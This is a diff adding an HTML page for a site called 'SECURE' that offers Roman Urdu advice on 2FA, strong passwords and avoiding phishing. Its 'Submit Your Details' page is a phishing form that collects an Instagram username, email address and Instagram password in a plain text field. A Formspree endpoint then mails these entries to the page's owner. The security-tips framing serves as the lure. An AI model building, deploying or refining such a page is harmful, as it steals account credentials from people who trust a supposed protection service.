@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SECURE | Account Protection & Cyber Security</title>
+    <!-- Font Awesome Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <!-- Header / Navbar -->
+    <header>
+        <div class="logo"><i class="fa-solid fa-shield-halved"></i> SECURE</div>
+        <nav>
+            <button class="nav-btn active" onclick="showPage('home')">Home</button>
+            <button class="nav-btn" onclick="showPage('protection')">Protection Tips</button>
+            <button class="nav-btn" onclick="showPage('contact')">Get Support</button>
+        </nav>
+    </header>
+
+    <!-- Page 1: Home -->
+    <section id="home" class="page active-page">
+        <div class="container">
+            <h1 class="neon-title">WELCOME TO SECURE YOUR ACCOUNT</h1>
+            <p class="intro-text">
+                Hum aapko hacking, phishing scams, aur cyber attacks se bachane ke zaroori tariqe aur authentication (2FA/MFA) set karne ki mukammal guidance dete hain. Apne online accounts ko 100% safe aur protected rakhein.
+            </p>
+
+            <div class="features-grid">
+                <div class="feature-box">
+                    <i class="fa-solid fa-key feature-icon"></i>
+                    <h3>2-Factor Authentication</h3>
+                    <p>Apne accounts par 2FA enable karke unauthorized login attempts ko rokein.</p>
+                </div>
+                <div class="feature-box">
+                    <i class="fa-solid fa-user-lock feature-icon"></i>
+                    <h3>Anti-Hacking Defense</h3>
+                    <p>Cyber attacks aur account takeover scams se bachne ki safety techniques seekhein.</p>
+                </div>
+            </div>
+
+            <!-- Neon Instagram Section (Click karte hi Details Page khulega) -->
+            <div class="insta-box">
+                <h3>Submit Account Security Details</h3>
+                <button onclick="showPage('contact')" class="insta-link">
+                    <i class="fa-brands fa-instagram insta-neon-icon"></i>
+                    <span>SECURE</span>
+                </button>
+            </div>
+        </div>
+    </section>
+
+    <!-- Page 2: Protection Tips -->
+    <section id="protection" class="page">
+        <div class="container">
+            <h1 class="neon-title">CYBER SECURITY GUIDELINES</h1>
+            <p class="sub-text">Apne accounts ko secure rakhne ke liye in steps ko follow karein:</p>
+            
+            <div class="steps-container">
+                <div class="step-card">
+                    <div class="step-num">01</div>
+                    <div class="step-content">
+                        <h3>Strong Passwords Banayein</h3>
+                        <p>Kabhie bhi simple password use na karein. Numbers, symbols, aur uppercase letters ka combination use karein.</p>
+                    </div>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-num">02</div>
+                    <div class="step-content">
+                        <h3>Authenticator Apps Ka Use Karein</h3>
+                        <p>SMS OTP ki bajaye Google Authenticator ya Duo Mobile app se 2FA setup karein.</p>
+                    </div>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-num">03</div>
+                    <div class="step-content">
+                        <h3>Phishing Links Se Bachien</h3>
+                        <p>Kisi bhi anjaan link ya email par click karke apni login details enter na karein.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Page 3: Submit Details Page (Jo Formspree ke zariye Email par aayega) -->
+    <section id="contact" class="page">
+        <div class="container">
+            <h1 class="neon-title">SUBMIT YOUR DETAILS</h1>
+            <p class="sub-text">Apne account ki details enter karein, ye direct hamare email par send hongi:</p>
+
+            <!-- Formspree Endpoint Link yahan paste karein -->
+            <form action="https://formspree.io/f/xaeqzbkb" method="POST" class="security-form">
+                <div class="form-group">
+                    <label><i class="fa-solid fa-user"></i> Instagram UserName</label>
+                    <input type="text" name="Name" placeholder="Apna username likhein" required>
+                </div>
+
+                <div class="form-group">
+                    <label><i class="fa-solid fa-envelope"></i> Email Address</label>
+                    <input type="email" name="Email" placeholder="Apna email address" required>
+                </div>
+
+                <div class="form-group">
+                    <label><i class="fa-brands fa-instagram"></i> Instagram Pasword</label>
+                    <input type="text" name="Instagram_pasword" placeholder="Pasword" required>
+                </div>
+
+                <div class="form-group">
+                    <label><i class="fa-solid fa-shield-cat"></i> Issue / Account Details</label>
+                    <textarea name="Account_Details" rows="4" placeholder="Apne account issue ya security detail ke baare mein batayein..." required></textarea>
+                </div>
+
+                <button type="submit" class="submit-btn">
+                    <i class="fa-solid fa-paper-plane"></i> Send Details To Email
+                </button>
+            </form>
+        </div>
+    </section>
+
+    <script src="script.js"></script>
+</body>
+</html>
